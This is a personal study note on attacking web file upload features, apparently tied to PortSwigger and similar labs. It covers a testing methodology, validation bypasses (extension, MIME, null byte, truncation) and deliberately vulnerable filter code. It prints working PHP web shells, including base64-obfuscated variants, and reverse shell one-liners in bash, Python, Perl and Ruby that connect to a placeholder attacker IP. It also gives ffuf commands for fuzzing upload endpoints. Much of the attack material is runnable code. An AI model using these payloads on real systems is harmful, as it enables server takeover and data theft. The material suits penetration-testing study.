---
created: 2026-05-02
tags:
  - web_hacking
---

## File uploads

- File upload functionality is one of the most common features in modern web applications — it's used for avatars, documents, media, and data import/export. 
- And it keeps showing up in high-severity findings because it is what bridges user input, file storage, server-side processing, and sometimes **code execution**.

>A **file upload vulnerability** occurs when an application fails to properly validate the content, name, size, type or other properties of a user-supplied file before processing or storing it.

>[!important] The most common cause of file upload vulnerabilities is missing, insufficient, or improperly implemented validation.


- The actual impact of file upload vulnerabilities depends on:
	- What file types the application accepts (by extension and format).
	- Which libraries process uploaded files on the back end (e.g., `ImageMagick`, `Ghostscript`, `ffmpeg`).
	- Where files are stored — within the web root or outside it.
	- Whether stored files are accessible and executable via HTTP requests.
	- What access controls govern uploaded file retrieval.


>[!important] Unlike many vulnerabilities that require chaining multiple weaknesses to achieve meaningful impact, file upload flaws often allow **direct exploitation with minimal prerequisites**.

> [!note] File upload vulnerabilities can arise not only from insecure upload logic but also from vulnerable third-party libraries used to process files. `ImageMagick`'s [CVE-2016-3714 ](https://nvd.nist.gov/vuln/detail/CVE-2016-3714)("`ImageTragik`") and [CVE-2022-44268 ](https://nvd.nist.gov/vuln/detail/cve-2022-44268) are classic examples of processor-level vulnerabilities triggered by uploading specifically-crafted images.


>[!bug]+ Labs
>- [[🛠️ File upload labs#1. Remote code execution via web shell upload|1. Remote code execution via web shell upload]]
>- [[🛠️ File upload labs#2. Web shell upload via Content-Type restriction bypass|2. Web shell upload via Content-Type restriction bypass]]
>- [[🛠️ File upload labs#3. Web shell upload via path traversal|3. Web shell upload via path traversal]]
>- [[🛠️ File upload labs#4. Web shell upload via extension blacklist bypass|4. Web shell upload via extension blacklist bypass]]
>- [[🛠️ File upload labs#5. Web shell upload via obfuscated file extension|5. Web shell upload via obfuscated file extension]]
>- [[🛠️ File upload labs#6. Remote code execution via polyglot web shell upload|6. Remote code execution via polyglot web shell upload]]
### Potential impact


- **Remote Code Execution (RCE)**
	- Uploading files of types the server is configured to execute (e.g., `.php`, `.jsp`, `.aspx`, `.py`, etc.) and triggering execution via HTTP requests.

- **Stored XSS**
	- Uploading HTML, SVG, or JavaScript files that get served with the appropriate MIME type (`text/html`, `image/svg+xml`, `text/javascript`) and tricking target users into opening them; the  attacker-controlled JavaScript is then executed in victims' browsers.

- **XXE (XML External Entity) or SSRF (Server-Side Request Forgery)**
	- Uploading XML-based files (e.g., SVG, DOCX, PDF, or XML itself) can trigger server-side parsers. An XML's `<!DOCTYPE>` entity declaration can cause the server to fetch local or internal network resources.

- **File overwrite**
	- If path traversal sequences are permitted in filenames, an attacker can write files to arbitrary locations, overwriting configuration files, scripts, or SSH keys.
	- See [[🛠️ Path traversal|🛠️ Path traversal]].

- **Denial of Service (DoS)**
	- Decompression bombs (a ZIP containing a ZIP containing a ZIP...) or pixel flood attacks (a PNG claiming extreme dimensions) can exhaust CPU, memory, or disk resources of the target server, taking it offline.

- **Phishing and defacement**
	- Uploading HTML pages to a trusted domain allows an attacker to abuse to abuse the domain's reputation to host convincing phishing pages.

## How servers handle file uploads

- Most commonly, file uploads use the `multipart/form-data` content type, which breaks the request body into labeled parts, each separated by a boundary string.

```HTTP
POST /upload HTTP/1.1
Host: example.com
<other headers...>
Content-Length: <total size of the request body>
Content-Type: multipart/form-data; boundary=---------------------------7970204168003706453399115153

---------------------------7970204168003706453399115153
Content-Disposition: form-data; name="file"; filename="mountains.jpg"
Content-Type: image/jpeg

<binary content of the JPEG file...>
---------------------------7970204168003706453399115153
Content-Disposition: form-data; name="description"

A very interesting description of an image.

-----------------------------7970204168003706453399115153
<other form fields...>
```

- Key fields:
	- `boundary` — The delimiter that separates the fields. It's declared in the `Content-Type` header and must be unique enough to not appear in the data itself.
	- `Content-Disposition` — Contains the `name `field (maps to the HTML form field) and the `filename` field (the uploaded file's name). The latter may or may not be used by the target server to name stored files.
	- `Content-Type` (part-level) — Specifies the MIME type of the uploaded part. The browser sets this automatically based on file extension, but you can change it to anything you want in Burp.

![[🛠️ How servers handle file uploads#Multi-part requests]]

>[!note]+ For a more complete overview on different file upload methods, see [[🛠️ How servers handle file uploads]].

- **Virtually no multipart parser fully complies with [`RFC 7578 — Returning Values from Forms: multipart/form-data`](https://datatracker.ietf.org/doc/html/rfc7578)**, and every deviation in parsing behavior is a potential bypass surface.
- A WAF may parse the `Content-Disposition` header one way; the backend PHP or Node.js parser may parse it differently. These discrepancies are directly exploitable.

>[!note] See [`Breaing Down Multipart Parsers: File upload validation bypass — Andrea Menin, Sicuranext`](https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/).

- Key behaviors that differ across parsers:
	- **Duplicate parameter handling** — Does the parser take the first `filename` value or the last?
	- **Quoted vs. unquoted parameter values** — Does it require quotes around `filename`?
	- **Unknown headers in parts** — Does the parser reject or ignore extra headers beyond `Content-Disposition` and `Content-Type`?
	- **Malformed boundaries** — Does the parser fail or attempt recovery?
	- **Trailing whitespace and newlines** — Are they stripped before comparison or not?
	- **Parameter name case sensitivity** — Is `FILENAME` equivalent to `filename`?

When one bypass technique fails, try another variation — you are looking for the specific gap between the WAF's parser and the backend's parser.

TODO: maybe move this text about discrepancies to validation bypass?
## File upload testing methodology
### 1. Identify upload endpoints

- Map all file upload functionality in the application. 
- Look for:
	- Profile/avatar upload
	- Document processing (PDF, DOCX, XLSX imports)
	- Chat/message attachments
	- Import/export features
	- Theme/template upload
	- Plugin/extension import
	- Backup and restore
	- Report submission
	- Etc.

- Search for file input elements in page source:

```bash
curl -s https://example.com/index.php | grep -i '<input.*type.*file'
```

- Grep for upload-related JavaScript:

```bash
curl -s https://example.com/app.js | grep -i "upload\|FormData\|XMLHttpRequest"
```

- Inspect the `<input type="file">` element:
	- Does it have an `accept` attribute (e.g., `accept="image/*"`)? This tell you what types are *intended* — and provides a starting point for what to test.
	- Does it have JavaScript validation on `submit`? Read the validation logic.
- Once you find something, upload a benign file and capture the full request in Burp. 
### 2. Fingerprint the technology stack

- What the server executes depends entirely on its technology stack. Determine the back-end language, web server, and frameworks used by the target application.

```bash
whatweb https://example.com
```

>[!note] See [[🛠️ Fingerprinting]].

### 3. Analyze validation

- **Establish a baseline:**
	- What does a successful upload response look like? 
	- What does a rejected one look like?
	- What file types are explicitly accepted?
	- What is the maximum file size?
	- Are unauthenticated uploads possible? Are there differences in behavior between authenticated and unauthenticated sessions?
	- What do error messages reveal?

> [!note] Verbose error messages are valuable during this phase. A PHP error like `Warning: move_uploaded_file(): failed to open stream in /var/www/html/upload.php on line 42` reveals the absolute path of the upload script and possibly the upload directory.

- **Inspect the response to a legitimate file upload:**
	- Does the response body contain the full or relative path to the uploaded file? (e.g., `/uploads/image.jpg`)
	- What filename does the server use — the original filename (`Content-Disposition`'s `filename`), a sanitized version, a hash, a UUID, or a sequential ID?
		- If sequential IDs are used, test for [[IDOR]]: can you access other users' files by incrementing/decrementing the ID?
		- If hash-based names are used (MD5/SHA-1/SHA-2 of content or original filename), you can calculate the stored name and access it directly.
		- Timestamps or date-based can often be guessed.

- **Determine what is validated and where — send deliberately malformed uploads and observe the behavior**:
	- Upload a file with a blocked extension — does the error happen before or after the file reaches disk? Timing differences can reveal whether the file is written then deleted or rejected pre-write.
	- Try uploading with an empty filename: `filename=""` — does the application error?
	- Try uploading a zero-byte file — does size validation trigger?
	- Try uploading an extremely large file (>50 MB) — does size validation trigger?
	- Do error messages reveal any information about the backend you can abuse?

#### Map the validation logic 

- Understand what and how the server validates. 
 
 Most validation falls into one of these categories:
 - **File extension check** (most common)
	 - The server checks whether the filename ends with (or contains) an allowed or blocked extension.
	 - Whitelist-based extension checks (only allow `.jpg`, `.png`, `.gif`) are harder to bypass than blacklists (block `.php`, `.asp`, `.jsp`) — you need to find a payload that passes the validation but still executes. Blacklists are trivially incomplete.
- **MIME type check**
	- The server reads the `Content-Type` header from the multipart part. This value is user-controller and can be spoofed easily.  
- **Magic byte check**
	- The server reads the first few bytes of the file content and compares them against a table of known signatures.
	- This is harder to bypass but still possible by prepending the expected signature to the payload or creating a polyglot file using tools like `exiftool`.
- **Full content inspection**
	- The server either uses an antivirus library that parses the entire file or tries to actually decode the file as an image (using something like `getimagesize()` in PHP or PIL/Pillow in Python). This is the hardest to bypass. 
	- However:
		- `getimagesize()` returns valid data for polyglot files with correct magic bytes.
		- PIL/Pillow re-encodes images, which may destroy injected EXIF code — but PLTE/IDAT injection in PNG can survive re-encoding.
		- Antivirus rarely catches custom PHP web shells that don't match known signatures.
	- In other words, content inspection bypass depends entirely on the specific implementation.

>[!note] See the [[#Validation bypass]] section.

> [!tip]+ 
> Sometimes you may not need extension bypasses at all. Potential vulnerabilities based on allowed types:
> - `.svg`: XXE, XSS, SSRF
> - `.gif`: XSS
> - `.csv`: CSV Injection
> - `.xml`: XXE
> - `.avi`: LFI, SSRF
> - `.js` : XSS, Open Redirect
> - `.zip`: RCE, DOS, LFI Gadget
> - `.html` : XSS, Open Redirect
### 4. Locate the upload directory

>[!important] Files outside the web root can't be accessed via HTTP.

- Common upload paths:

```
/uploads/
/upload/
/files/
/media/
/assets/uploads/
/profile/pictures/
/avatar/uploads/
/documents/
/documents/upload
/storage/
/tmp/
/import/
```

- Analyze the URL returned in a successful upload response (many apps return the file path directly).
- Inspect page source for `<img src="...">` tags pointing to your uploaded avatar.
- Search JavaScript files for path hints.
- Run directory brute-force against common upload paths:

```bash
ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
```

- If you get a `403 Forbidden` on the directory, check for directory listing bypasses.

### 5. Bypass filtering

- Systematically try to bypass validation — from the most obvious to more complex techniques.

>[!note] See the [[#Validation bypass]] section.

>[!tip] When you encounter validation, try the cheapest bypass fiest (MIME spoofing), then escalate to extension bypasses, magic bytes, then polyglots. Reserve the more complex techniques for cases where simpler ones fail.

### 6. Access and execute

Once a bypass succeeds, confirm the file is accessible and — for RCE — trigger execution:

- Confirm file is accessible:

```bash
curl -s https://example.com/uploads/shell.php
```

- Trigger command execution:

```bash
curl -s "https://example.com/uploads/shell.php?cmd=id"
```

If execution returns the output of `id`, you have RCE.
## Remote code execution via file upload

- For **RCE (Remove Code Execution)** via file upload to be possible, two conditions must hold simultaneously:
	1. The application allows you to upload a file with an extension the server is configured to execute (`.php`, `.asp`, `.aspx`, `.jsp`, `.py`, etc.).
	2. The uploaded file is stored somewhere you can access via an HTTP request to trigger the execution.

> [!note]+ Interpreted vs. compiled languages 
> - RCE via file upload is most commonly associated with *interpreted languages* (PHP, Python, Ruby, Perl) — the source file itself (the script you upload) is the executable as-is. 
> - With *compiled languages* like Java, the attack surface shifts to uploading WAR/JAR archives, compiled binaries, CGI scripts, or exploiting the application server's deployment mechanism directly.

### Web shells


> A **web shell** is a script or program uploaded to a web server that provides an HTTP-accessible interface for executing arbitrary operating system commands on the server.


>[!example]+ Example: Minimal PHP web shell
> 
> ```PHP
> <?php echo system($_GET["cmd"]); ?>
> ```
> - Commands are passed in the `cmd` URL query parameter:
> ```
> https://example.com/uploads/webshell.php?cmd=id
> https://example.com/uploads/webshell.php?cmd=whoami
> https://example.com/uploads/webshell.php?cmd=cat%20/etc/passwd
> ```
> ![[images/walkthrough/PortSwigger/File Upload/lab3/3.png]]
> 

- Well-curated web shell collections:
	- [`JohnTroony/php-webshells`](https://github.com/JohnTroony/php-webshells) — Collection of PHP web shells.
	- [`BlackArch/webshells`](https://github.com/BlackArch/webshells) — Multi-language web shell collection (PHP, ASP, JSP, Perl, Python).
	- [`tennc/webshell`](https://github.com/tennc/webshell) — Large cross-language collection.
	- [`WhiteWinterWolf/wwwolf-php-webshell`](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) — Feature-rich PHP web shell with file browser.


>[!tip]- PHP web shell validation bypass
> - When `<?php` is blocked:
> 
> ```php
> <?= system($_GET['cmd']); ?>
> ```
> 
> ```php
> <script language="php">system($_GET['cmd']);</script>
> ```
> 
> ```php
> <?= `id` ?>
> ```
> 
> ```php
> <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
> # decodes to: system($_GET['cmd']);
> ```
> 
> - When `system` is blocked:
> 
> ```php
> <?php passthru($_GET['cmd']); ?>    # like system(), outputs result directly — great for binary output
> ```
> 
> ```php
> <?php exec($_GET['cmd']); ?>        # executes a command, returns only the last line of output
> ```
> 
> ```php
> <?php shell_exec($_GET['cmd']); ?>  # executes a command, returns full output as string
> ```
> 
> ```php
> <?php popen($_GET['cmd'], 'r'); ?>  # opens a pipe to a process
> ```
> 
> ```php
> <?php echo `$_GET['cmd']`; ?>            # backtick operator — returns output, requires echo to display
> ```
> 
> ```php
> <?php proc_open($_GET['cmd'], array(1 => array("pipe", "w")), $p); echo stream_get_contents($p[1]); ?> # most control
> ```
### Reverse shells

> A **reverse shell** is a connection initiated by the compromised server back to the attacker's machine, through which the attacker gains an interactive shell session on the target.

>[!example]+ Example: Simple PHP reverse shell
> 
> - Set up a listener on your machine:
> 
> ```bash
> rlwrap nc -lvnp 1337
> ```
> 
> - Upload and execute a PHP reverse shell on the target server:
> 
> ```PHP
> <?php
>   $sock = fsockopen("<attacker_ip_address>", 1337);
>   $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
> ?>
> ```
> 
> This opens a TCP connection yo your machine on port `1337`, then redirects all I/O to/from `/bin/sh` through the socket. The shell's `stdin`, `stdout`, and `stderr` all go over the network connection.

- After catching the shell, upgrade it to a fully interactive TTY:
	
	1. Spawn a PTY with Python:
	
	```bash
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	```
	
	2. Background the shell (Ctrl+Z), then fix your local terminal:
	
	```bash
	stty raw -echo; fg
	```
	
	3. Reset the terminal and set dimensions:
	
	```bash
	reset
	export TERM=xterm
	stty rows 50 cols 200
	```


- Common reverse shells:
	- [`php-reverse-shell.php`](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (almost industry standard)
	- [`PayloadsAllTheThings - Reverse Shell Cheatsheet`](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
	- [`Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python — HighOn.Coffee`](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

>[!important] Before uploading a reverse shell, make sure to change it to include your IP address and port.

- **Quick reference**:
	
	- Bash:
	
	```bash
	bash -i >& /dev/tcp/YOUR_IP/1337 0>&1
	```
	
	- Python 3:
	
	```bash
	python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP_ADDRESS",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
	```
	
	- Perl:
	
	```bash
	perl -e 'use Socket;$i="YOUR_IP";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
	```
	
	- Ruby:
	
	```bash
	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("YOUR_IP","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
	```

## Bypassing client-side controls

> **Client-side validation** refers to any input checks performed in the browser — via HTML attributes, JavaScript event handlers, or client-side framework logic — before the HTTP request is sent to the server.

- Client-side validation provides zero security protection. Every bit of code that runs in the browser is under the attacker's control. It is purely a user experience feature.

### HTML `accept` attribute

- The `accept` attribute in `<input type="file">` elements tells the browser what file types to display by default in a file picker dialog. 
- It does not validate files — it only guides the file picker UI for better user experience.

```HTML
<!-- only images in the file picker -->
<input type="file" name="avatar" accept="image/*">

<!-- specific extensions -->
<input type="file" name="photo" accept=".jpg,.jpeg,.png,.gif">

<!-- PDFs and images -->
<input type="file" name="document" accept="image/*,.pdf">

<!-- specific MIME types -->
<input type="file" name="upload" accept="image/jpeg,image/png,application/pdf">
```

- To "bypass", simply change the file picker dialog's filter to `All Files`, or intercept the request after submission and replace the file content. 
### JavaScript validation

- JavaScript can check extensions, MIME types, file sizes, and even read file content with the `FileReader` API before submission. But since runs entirely in the browser, it is trivially bypassed.

>[!example]- Example: JavaScript extension validation
> 
> ```JS
> function validateFile() {
>     var fileInput = document.getElementById('fileUpload');
>     var filePath = fileInput.value;
>     var allowedExtensions = /(\.jpg|\.png|\.gif)$/i;
>     # only allows files with .jpg, .png, and .gif extensions
>     
>     if (!allowedExtensions.exec(filePath)) {
>         alert('Invalid file type. Please, upload a JPEG, PNG, or GIF file.');
>         fileInput.value = '';
>         return false;
>     }
>     return true;
> }
> 
> # event handler
> document.getElementById('uploadForm').addEventListener('submit', function(e) {
>     if (!validateFile()) {
>         e.preventDefault(); # prevent form submission if file extension is invalid
>     }
> });
> ```

- Ways to bypass JavaScript validation:

	- **Disable JavaScript entirely**
		- Use browser settings, extensions like `uBlock Origin`, or the browser Developer Tools (`F12` or `Ctrl + Shift + I` → `Sources` → right-click a script → `Add script to ignore list` or similar).

	- **Modify HTML in DevTools**
		- Right-click the form element -> `Inspect` -> `Edit as HTML` -> Edit the `accept` attribute or remote `onsubmit` JavaScript handlers.

	- **Modify JavaScript in DevTools**
		- Open `Sources` tab, find the validation function, edit it in place (remove the validation block or make it always return `true`).

	- **Intercept with Burp Suite** (the most reliable method)
		- Let the browser's validation pass (upload a legitimate file), then use Burp's `Intercept` to modify the filename, `Content-Type`, and file content in-flight before the request reaches the server. The JavaScript validation already passed before Burp intercepts.

	- **Craft requests directory**
		- Bypass the browser entirely using `curl`, Python `requests`, or Burp Repeater (send a legitimate file upload request to `Repeater`, modify it, then `Send`).

		```bash
		# upload a PHP file, spoof the MIME type as an image
		curl -s -X POST https://example.com/upload \
		  -F "file=@shell.php;type=image/jpeg" \
		  -F "action=upload"
		```

## Server-side filtering bypass

Server-side validation can check:
- **File extension** (blacklist or whitelist)
- **MIME type** (`Content-Type`)
- **File size**
- **Magic bytes** (first bytes of the file)
- **Full content** (deep inspection of the entire file structure)


### Fuzzing allowed extensions

- With blacklist-based file extension filters, use fuzzing to enumerate what is and is not blocked. Blacklists often block common extensions `.php`, `.asp`, `.jsp`  but miss alternatives that are still recognized and executed by the server.

- Use Burp Intruder, `ffuf`, or other tools.
- Extension wordlists:

	- General: [`SecLists/Discovery/Web-Content/web-extensions.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
	- PHP extensions: [`PayloadsAllTheThings/Upload Insecure Files/Extension PHP/extensions.lst`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
	- ASP extensions: [`PayloadsAllTheThings/Upload Insecure Files/Extension ASP/extensions.lst`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/extensions.lst)


> [!tip]- Extension lists
> - PHP extensions:
> 
> ```.php
> .php3
> .php4
> .php5
> .php7
> .php8
> .pht
> .phar
> .phpt
> .pgif
> .phtml
> .phtm
> .inc
> ```
> 
> - ASP extensions:
> 
> ```
> .asp
> .aspx
> .config
> .ashx
> .asmx
> .aspq
> .axd
> .cshtm
> .cshtml
> .rem
> .soap
> .vbhtm
> .bvhtml
> .asa
> .cer
> .shtml
> ```
> 
> - JSP extensions:
> 
> ```
> .jsp
> .jsp
> .jspx
> .jsw
> .jsv
> .jspf
> .wss
> .do
> .action
> ```
> 
> - Perl extensions:
> 
> ```
> .pl
> .pm
> .cgi
> .lib
> ```
> 
> - ColdFusion extensions:
> 
> ```
> .cfm
> .cfml
> .cfc
> .dbm
> ```
> 
> - Node.js extensions:
> 
> ```
> .js
> .json
> .node
> ```

>[!example]+ Example of vulnerable code
> 
> ```Python
> # case-sensitive blacklist 
> blocked_extensions = ['.php', '.jsp', '.asp', '.sh', '.py']
> 
> def is_blocked(filename):
>     for ext in blocked_extensions:
>         if filename.endswith(ext): # bypassed by .phtml, .PHP, .php5
>             return True
>     return False
> 
> ```
### Double extension bypass

- Some applications check whether an allowed extension _exists anywhere_ in the filename rather than checking that the filename _ends with_ an allowed extension.

```bash
shell.jpg.php   # if the server prefers last extension
shell.php.jpg   # if the server prefers first executable extension
shell.png.py
shell.pdf.jsp
shell.gif.aspx
```

- How the file is ultimately handled depends on web server configuration:
	- Apache with `mod_php`: processes the rightmost extension it recognizes as executable. `shell.jpg.php` → PHP.
	- Some older IIS configurations prioritize the _first_ executable extension.
	- Nginx typically doesn't execute based on extension alone — it passes to a FastCGI handler (PHP-FPM) based on configured patterns, which may match `.php` anywhere in the path (a separate misconfiguration).

>[!example]+ Example: Vulnerable code (PHP)
>
> ```PHP
> function isValidFile($filename) {
>     $allowedExtensions = ['.jpg', '.png', '.gif'];
>      # checks for the presence of any of the allowed extensions anywhere in the file name
>     foreach ($allowedExtensions as $ext) {
>         if (strpos($filename, $ext) !== false) {
>             return true;
>         }
>     }
>     return false;
> }
> ```
### Case variation bypass

- Case-sensitive blacklists fail against simple case changes:

```
shell.PHP
shell.PhP
shell.PHP5
shell.PhAr
shell.ASP
shell.JSP
```

> [!note] On case-insensitive filesystems (Windows NTFS, macOS HFS+), `shell.PHP` and `shell.php` resolve to the same file. The filter may be case-sensitive while the filesystem is not — a classic mismatch.
### Null byte bypass

> A **null byte** (`\x00`, `%00`, `\0`) is a zero-value byte character used as a string terminator in C and C-derived languages, notably the C standard library which many web language runtimes rely on.

- In some legacy or poorly configured systems, injecting a null byte (`%00`) after a forbidden file extension — but before an allowed one — can truncate the filename. 
- As a result, the server may ignore the trailing "safe" extension that filters permitted, leaving only the filename before the null byte.

```powershell
shell.php%00.jpg   → stored as shell.php (on vulnerable systems)
shell.php\x00.gif
```

>[!note] This worked in PHP prior to version 5.3.4 (patched in 2010). On modern applications it is largely ineffective, but it is still worth trying on older systems. The `pathinfo()` function in PHP was specifically vulnerable to this behavior.
### Special characters and delimiter injection

- Aside from null bytes, introducing special characters might mislead parsers and cause the filename to be prematurely truncated.

```powershell
shell.php%20.png         # URL-encoded space
shell.php .png           # literal trailing space

shell.php%0a.png         # newline

shell.php%0d%0a.png      # CRLF
shell.php\r\n.png     
shell.php\x0d\x0a.png 


shell.php/.png           # forward slash
shell.php\.png           # backslash
shell.php/
shell.php\
shell.p/ph
shell.ph\p
shell.php.\

shell.                # empty file extension
.php                  # empty file name


shell.php.               # trailing dot
shell.php....            # multiple trailing dots
shell.php;.png           # semicolon
shell.php::              # double colon (Windows ADS)
shell.php:::

shell.#php               # hash character

shell.php\u200B.png      # zero-width space (Unicode)

shell.phpxC0 x2E.png     # Unicode characters
shell.phpxC4 xAE.png
shell.phpxC0 xAE.png

```


>[!note] Trailing dots on Windows
>- When you create a file named `shell.php.` on Windows, the underlying Win32 API strips the trailing dot and saves the file as `shell.php`. 
>- This means that a filter that checks the last extension sees `.` (empty extension after the dot), but the filesystem stores `shell.php`.
> ```
> shell.php.    → Windows stores as shell.php
> ```

>[!note]+ RTLO (Right-to-Left Override)
> 
> The Unicode character `\u202E` reverses text direction. The filename `name.%E2%80%AEphp.jpg` appears visually as `name.gpj.php` to the filter while the actual bytes are different.

- The best way to know what bypasses filters is fuzz characters systemetically. You can use this wordlist (run the command to print it out):

```bash
echo "'" && echo '! " # $ % &  ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~ %21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F %3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E' | tr ' ' '\n'
```

![[intruder_fuzz_delimiters.png]]
### Nested extensions

- Some applications sanitize filenames by removing dangerous extensions from the string. Non-recursive sanitization can be bypassed by nesting the extension inside itself:

```powershell
shell.p.phphp    → after stripping .php once → shell.php
shell.as.aspp    → after stripping .asp once → shell.asp
```

- If the extension is checked multiple times, but still non-recursively:

```powershell
shell.ph.ph.ph.ph.phppppp → shell.php after multiple passes
shell.a.as.as.a.aspspppsp → shell.asp
```

>[!example]+ Example: Vulnerable code 
> ```Python
> # non-recursive sanitization
> def sanitize_filename(filename):
>     dangerous_exts = ['.php', '.asp', '.jsp']
>     for ext in dangerous_exts:
>         filename = filename.replace(ext, '') # strips extension, but just once
>     return filename
> 
> ```
### Truncation attacks

- Most filesystems cap filenames at 255 bytes (Linux ext4, Windows NTFS, FAT32). If you craft a filename long enough that the system truncates it, you can arrange for the safe extension to be cut off.


- The goal is to make the filename so long that the safe extension the filter requires (e.g., `.jpg`) falls beyond byte 255 and gets truncated, leaving only the target executable extension (`.php`):

```
AAAAAAAAAAAAAAAAAAAA...AAAAAAAAAAAAAAAAAAAAA.php.jpg
```

-  Python to generate a truncation filename:

```python
padding = 'A' * (255 - len('.php.jpg'))
filename = padding + '.php.jpg'
print(len(filename))   # should be 255
print(filename[-8:])   # should end in .php.jpg
# when saved: AAAAA...AAAA.php (the .jpg is cut off at byte 255)
```


- This attack requires the file extension check to pass before truncation occurs — e.g., the filter checks `filename.endswith('.jpg')` first, then passes the full name to the filesystem, which then truncates it.


The goal is to make the filename so long that when the server saves it, the safe extension (`.jpg`) gets truncated off, leaving only the executable extension (`.php`):

```
AAAAAAAAAAAAAAAAAAAA...AAAAAAAAAAAAAAAAAAAAA.php.jpg
```

- It's easier to generate such names with Python:

```Python
padding = 'A' * (255 - len('.jpg'))
filename = padding + '.php' + '.jpg'

print(len(filename))
```

>[!example]+
> ```Python
>>> padding = 'A' * (255 - len('.jpg'))
>>> filename = padding + '.php' + '.jpg'
>>> print(len(filename))
> 259
>>> filename
> 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.jpg'
> ```

### MIME type bypasses

- Applications often check the MIME type specified in the `Content-Type` header in multipart form submissions. But it's entirely client-controlled and trivially spoofed.

>[!interesting]+ How `Content-Type` is set 
>When you upload a file, your browser automatically sets the `Content-Type` header, primarily based on the file extension. For example:
>- `.jpg` ⇢ `Content-Type: image/jpeg`
>- `.png` ⇢ `Content-Type: image/png`
>- `.pdf` ⇢ `Content-Type: application/pdf`
>- `.php` ⇢ `Content-Type: application/x-httpd-php` or `text/x-php`
>


- Attempt to bypass validation:
	- Change the original value of the `Content-Type` header the multipart request to an allowed MIME type, such as `image/jpeg`, `image/png`, or `image/gif`.
	- Remove the `Content-Type` header entirely.

- Common MIME types to try when image is expected:

```
image/jpeg
image/png
image/gif
image/webp
image/bmp
image/svg+xml
text/plain
application/octet-stream
application/x-empty
```

>[!example]-
> - Original request:
> 
> ```bash
> # ...
> ------WebKitFormBoundary
> Content-Disposition: form-data; name="file"; filename="shell.php"
> Content-Type: application/x-php # MIME type of a PHP executable
> 
> <?php system($_GET['cmd']); ?>
> ------WebKitFormBoundary--
> ```
> 
> - Changed MIME type:
> 
> ```bash
> # ...
> ------WebKitFormBoundary
> Content-Disposition: form-data; name="file"; filename="shell.php"
> Content-Type: image/jpeg # MIME type of a JPEG image
> 
> <?php system($_GET['cmd']); ?>
> ------WebKitFormBoundary--
> ```

 - To fuzz allowed MIME types, use [`SecLists/Discovery/Web-Content/web-all-content-types.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) (almost 2.4K entries).


```bash
ffuf -X POST \
  -H 'Content-Type: multipart/form-data; boundary=----Boundary' \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: FUZZ\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------Boundary--\r\n' \
  -u https://example.com/upload \
  -w /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt \
  -c -mc 200 -fs 23
```

>[!example]+ Example: Fuzzing `Content-Type` header 
> ```bash
> fuf -X POST -H 'Content-Length: 192' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3ftqljjV5IiF2SST' --data-binary $'------WebKitFormBoundary3ftqljjV5IiF2SST\x0d\x0aContent-Disposition: form-data; name=\"uploadFile\"; filename=\"test.jpg\"\x0d\x0aContent-Type: FUZZ\x0d\x0a\x0d\x0a\xff\xd8\xff\xe0\x0d\x0a------WebKitFormBoundary3ftqljjV5IiF2SST--\x0d\x0a' -u 'http://83.136.255.106:52195/upload.php' -w web-all-content-types.txt -c -ic -fs 23
> ```
> 
> ```bash
> 
>         /'___\  /'___\           /'___\       
>        /\ \__/ /\ \__/  __  __  /\ \__/       
>        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
>         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
>          \ \_\   \ \_\  \ \____/  \ \_\       
>           \/_/    \/_/   \/___/    \/_/       
> 
>        v2.1.0-dev
> ________________________________________________
> 
>  :: Method           : POST
>  :: URL              : http://83.136.255.106:52195/upload.php
>  :: Wordlist         : FUZZ: /home/htb-ac-1908986/web-all-content-types.txt
>  :: Header           : Content-Length: 192
>  :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3ftqljjV5IiF2SST
>  :: Data             : ------WebKitFormBoundary3ftqljjV5IiF2SST
> Content-Disposition: form-data; name="uploadFile"; filename="test.jpg"
> Content-Type: FUZZ
> 
> ����
> ------WebKitFormBoundary3ftqljjV5IiF2SST--
> 
>  :: Follow redirects : false
>  :: Calibration      : false
